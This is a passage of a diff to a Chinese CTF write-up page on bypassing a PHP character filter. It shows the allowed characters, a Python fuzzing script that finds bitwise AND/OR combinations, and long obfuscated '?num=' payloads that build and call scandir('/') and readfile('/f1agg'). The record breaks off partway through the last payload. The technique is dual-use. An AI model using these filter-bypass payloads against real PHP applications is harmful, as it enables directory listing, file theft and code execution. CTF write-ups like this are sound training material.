class="string">'6'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">';'</span>, <span class="string">':'</span>, <span class="string">'='</span>, <span class="string">'&lt;'</span>, <span class="string">'?'</span>, <span class="string">'&gt;'</span>, <span class="string">'E'</span>, <span class="string">'e'</span>, <span class="string">'g'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>, <span class="string">'w'</span>, <span class="string">'&#125;'</span>])</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">set([<span class="hljs-string">'\x01'</span>, <span class="hljs-string">'\x00'</span>, <span class="hljs-string">'\x05'</span>, <span class="hljs-string">'\x04'</span>, <span class="hljs-string">'!'</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'%'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'0'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">';'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">'='</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'E'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'m'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'u'</span>, <span class="hljs-string">'w'</span>, <span class="hljs-string">'&#125;'</span>])</code></pre>
 
 <p>那么问题了，这是可用字符的极限了，我们可以打印如上字符的二进制</p>
 <p>最大位数是7bit,a-z的bit位数也正好是7位</p>
@@ -197,7 +313,7 @@
 <p>6bit的字符，每个bit都可以通过与或得到0或1,可以得到6bit区间内的所有字符</p>
 <p>7bit的字符，倒三字符还有倒一都是1,无法与或置为0，限制了7bit额外字符的生成,也就是限制了a-z字符生成</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'0b1'</span>, <span class="string">'0b0'</span>, <span class="string">'0b101'</span>, <span class="string">'0b100'</span>, <span class="string">'0b100001'</span>, <span class="string">'0b100000'</span>, <span class="string">'0b100011'</span>, <span class="string">'0b100010'</span>, <span class="string">'0b100101'</span>, <span class="string">'0b100100'</span>, <span class="string">'0b100111'</span>, <span class="string">'0b100110'</span>, <span class="string">'0b101001'</span>, <span class="string">'0b101000'</span>, <span class="string">'0b101011'</span>, <span class="string">'0b101010'</span>, <span class="string">'0b101101'</span>, <span class="string">'0b101100'</span>, <span class="string">'0b101111'</span>, <span class="string">'0b101110'</span>, <span class="string">'0b110001'</span>, <span class="string">'0b110000'</span>, <span class="string">'0b110011'</span>, <span class="string">'0b110010'</span>, <span class="string">'0b110101'</span>, <span class="string">'0b110100'</span>, <span class="string">'0b110111'</span>, <span class="string">'0b110110'</span>, <span class="string">'0b111001'</span>, <span class="string">'0b111000'</span>, <span class="string">'0b111011'</span>, <span class="string">'0b111010'</span>, <span class="string">'0b111101'</span>, <span class="string">'0b111100'</span>, <span class="string">'0b111111'</span>, <span class="string">'0b111110'</span>, <span class="string">'0b1000101'</span>, <span class="string">'0b1100101'</span>, <span class="string">'0b1100111'</span>, <span class="string">'0b1101101'</span>, <span class="string">'0b1101111'</span>, <span class="string">'0b1110101'</span>, <span class="string">'0b1110111'</span>, <span class="string">'0b1111101'</span>]</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">[<span class="hljs-string">'0b1'</span>, <span class="hljs-string">'0b0'</span>, <span class="hljs-string">'0b101'</span>, <span class="hljs-string">'0b100'</span>, <span class="hljs-string">'0b100001'</span>, <span class="hljs-string">'0b100000'</span>, <span class="hljs-string">'0b100011'</span>, <span class="hljs-string">'0b100010'</span>, <span class="hljs-string">'0b100101'</span>, <span class="hljs-string">'0b100100'</span>, <span class="hljs-string">'0b100111'</span>, <span class="hljs-string">'0b100110'</span>, <span class="hljs-string">'0b101001'</span>, <span class="hljs-string">'0b101000'</span>, <span class="hljs-string">'0b101011'</span>, <span class="hljs-string">'0b101010'</span>, <span class="hljs-string">'0b101101'</span>, <span class="hljs-string">'0b101100'</span>, <span class="hljs-string">'0b101111'</span>, <span class="hljs-string">'0b101110'</span>, <span class="hljs-string">'0b110001'</span>, <span class="hljs-string">'0b110000'</span>, <span class="hljs-string">'0b110011'</span>, <span class="hljs-string">'0b110010'</span>, <span class="hljs-string">'0b110101'</span>, <span class="hljs-string">'0b110100'</span>, <span class="hljs-string">'0b110111'</span>, <span class="hljs-string">'0b110110'</span>, <span class="hljs-string">'0b111001'</span>, <span class="hljs-string">'0b111000'</span>, <span class="hljs-string">'0b111011'</span>, <span class="hljs-string">'0b111010'</span>, <span class="hljs-string">'0b111101'</span>, <span class="hljs-string">'0b111100'</span>, <span class="hljs-string">'0b111111'</span>, <span class="hljs-string">'0b111110'</span>, <span class="hljs-string">'0b1000101'</span>, <span class="hljs-string">'0b1100101'</span>, <span class="hljs-string">'0b1100111'</span>, <span class="hljs-string">'0b1101101'</span>, <span class="hljs-string">'0b1101111'</span>, <span class="hljs-string">'0b1110101'</span>, <span class="hljs-string">'0b1110111'</span>, <span class="hljs-string">'0b1111101'</span>]</code></pre>
 
 <p>所以解决额外字符的思路出来了，制造出一个7bit二进制数，可以尽可能制造多的字符以节省劳动力，就不用费劲心思去运算得到其他字符。</p>
 <blockquote>
@@ -205,12 +321,53 @@
 <p>‘@’   生成可以用   ~’?’=&gt; (1或.——-?)</p>
 <p>在赋值到main参数，fuzz出可用字符与或结果</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">arr=[<span class="string">'\x01'</span>, <span class="string">'\x00'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span>, <span class="string">'!'</span>, <span class="string">' '</span>, <span class="string">'#'</span>, <span class="string">'"'</span>, <span class="string">'%'</span>, <span class="string">'$'</span>, <span class="string">"'"</span>, <span class="string">'&amp;'</span>, <span class="string">')'</span>, <span class="string">'('</span>, <span class="string">'+'</span>, <span class="string">'*'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">';'</span>, <span class="string">':'</span>, <span class="string">'='</span>, <span class="string">'&lt;'</span>, <span class="string">'?'</span>, <span class="string">'&gt;'</span>, <span class="string">'E'</span>, <span class="string">'e'</span>, <span class="string">'g'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>, <span class="string">'w'</span>, <span class="string">'&#125;'</span>]</span><br><span class="line">arr1=string.printable</span><br><span class="line">print(len(arr1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fuzz可以创造出最多的字符</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> arr1:</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">            <span class="keyword">if</span> chr(ord(flag)&amp;ord(i)) == j:</span><br><span class="line">                tmp.append(j)</span><br><span class="line">                <span class="comment">#print(i+' [&amp;] '+j)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'[&amp;]flag: '</span>+ flag+<span class="string">"=&gt;"</span>+str(len(set(tmp))))</span><br><span class="line">    print(set(tmp))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> arr1:</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">            <span class="keyword">if</span> chr(ord(flag)|ord(i)) == j:</span><br><span class="line">                tmp.append(j)</span><br><span class="line">                <span class="comment">#print(i+' [&amp;] '+j)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'[|]flag: '</span>+ flag+<span class="string">"=&gt;"</span>+str(len(set(tmp))))</span><br><span class="line">    print(set(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入'@'逆推需要的字符    </span></span><br><span class="line">main=<span class="string">'@'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">        <span class="keyword">if</span> chr(ord(main)|ord(i)) == j:</span><br><span class="line">            print(i+<span class="string">' [|] '</span>+main+<span class="string">' =&gt; '</span>+j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">        <span class="keyword">if</span> chr(ord(main)&amp;ord(i)) == j:</span><br><span class="line">            print(i+<span class="string">' [&amp;] '</span>+main+<span class="string">' =&gt; '</span>+j)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> string
+arr=[<span class="hljs-string">'\x01'</span>, <span class="hljs-string">'\x00'</span>, <span class="hljs-string">'\x05'</span>, <span class="hljs-string">'\x04'</span>, <span class="hljs-string">'!'</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'%'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'0'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">';'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">'='</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'E'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'m'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'u'</span>, <span class="hljs-string">'w'</span>, <span class="hljs-string">'&#125;'</span>]
+arr1=string.printable
+print(len(arr1))
+
+
+<span class="hljs-comment"># fuzz可以创造出最多的字符</span>
+<span class="hljs-keyword">for</span> flag <span class="hljs-keyword">in</span> arr1:
+    tmp=[]
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:
+            <span class="hljs-keyword">if</span> chr(ord(flag)&amp;ord(i)) == j:
+                tmp.append(j)
+                <span class="hljs-comment">#print(i+' [&amp;] '+j)</span>
+                <span class="hljs-keyword">break</span>
+    print(<span class="hljs-string">'[&amp;]flag: '</span>+ flag+<span class="hljs-string">"=&gt;"</span>+str(len(set(tmp))))
+    print(set(tmp))
+
+<span class="hljs-keyword">for</span> flag <span class="hljs-keyword">in</span> arr1:
+    tmp=[]
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:
+            <span class="hljs-keyword">if</span> chr(ord(flag)|ord(i)) == j:
+                tmp.append(j)
+                <span class="hljs-comment">#print(i+' [&amp;] '+j)</span>
+                <span class="hljs-keyword">break</span>
+    print(<span class="hljs-string">'[|]flag: '</span>+ flag+<span class="hljs-string">"=&gt;"</span>+str(len(set(tmp))))
+    print(set(tmp))
+
+<span class="hljs-comment"># 填入'@'逆推需要的字符    </span>
+main=<span class="hljs-string">'@'</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:
+        <span class="hljs-keyword">if</span> chr(ord(main)|ord(i)) == j:
+            print(i+<span class="hljs-string">' [|] '</span>+main+<span class="hljs-string">' =&gt; '</span>+j)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:
+        <span class="hljs-keyword">if</span> chr(ord(main)&amp;ord(i)) == j:
+            print(i+<span class="hljs-string">' [&amp;] '</span>+main+<span class="hljs-string">' =&gt; '</span>+j)</code></pre>
 
 
 
 <p>后面就手拼吧，脚本不会写了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先构造scandir(<span class="string">'/'</span>)扫描根目录下的文件，payload：</span><br><span class="line">?num=((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)).((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">首先构造scandir(<span class="hljs-string">'/'</span>)扫描根目录下的文件，payload：
+?num=((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))))</code></pre>
 
 
 
@@ -220,7 +377,9 @@
 
 
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile(<span class="string">'/f1agg'</span>)，payload：</span><br><span class="line"></span><br><span class="line">?num=(((((<span class="number">1</span>).(<span class="number">2</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">5</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">9</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))%<span class="number">26</span>((((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">8</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">5</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)).((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span 